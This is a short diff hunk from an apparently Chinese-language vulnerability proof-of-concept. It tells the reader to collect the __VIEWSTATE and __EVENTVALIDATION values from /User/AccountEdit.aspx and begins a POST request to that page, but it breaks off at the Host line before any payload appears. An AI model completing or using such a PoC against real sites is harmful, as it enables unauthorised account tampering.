@@ -2,7 +2,7 @@
 
 
 1、访问/User/AccountEdit.aspx，查看源代码，搜索__VIEWSTATE" value=" 和__EVENTVALIDATION" value="这两个字符串，记录下来
-## poc
+## POC
 ```
 POST /User/AccountEdit.aspx HTTP/1.1
 Host:
